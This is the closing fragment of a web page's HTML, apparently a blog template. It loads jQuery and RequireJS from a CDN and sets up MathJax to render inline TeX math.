<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>